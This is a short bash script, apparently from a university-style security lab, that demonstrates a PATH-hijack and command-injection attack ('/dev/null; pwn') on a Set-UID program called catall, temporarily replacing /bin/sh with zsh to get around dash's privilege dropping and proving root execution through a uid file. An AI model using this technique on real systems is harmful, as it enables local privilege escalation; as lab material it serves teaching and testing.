#!/bin/bash
# E6b: environment-variable hijack (PATH) against catall (before correction)
# Requires temporarily replacing /bin/sh with zsh, because dash drops
# Set-UID privilege on its own as a hardening measure (see JOURNAL.md).
rm -f /tmp/E6B_PROOF
mkdir -p /tmp/evil
cat > /tmp/evil/pwn << 'INNER'
#!/bin/sh
/usr/bin/id -u > /tmp/E6B_PROOF
INNER
chmod +x /tmp/evil/pwn
cd "$(dirname "$0")/../Labsetup" || exit 1
which zsh >/dev/null || sudo apt-get install -y zsh
sudo mv /bin/sh /bin/sh.orig
sudo ln -sf /bin/zsh /bin/sh
PATH=/tmp/evil:$PATH ./catall_e6b '/dev/null; pwn'
sudo rm /bin/sh
sudo mv /bin/sh.orig /bin/sh
echo "Proof file content (0 = ran as root):"
cat /tmp/E6B_PROOF
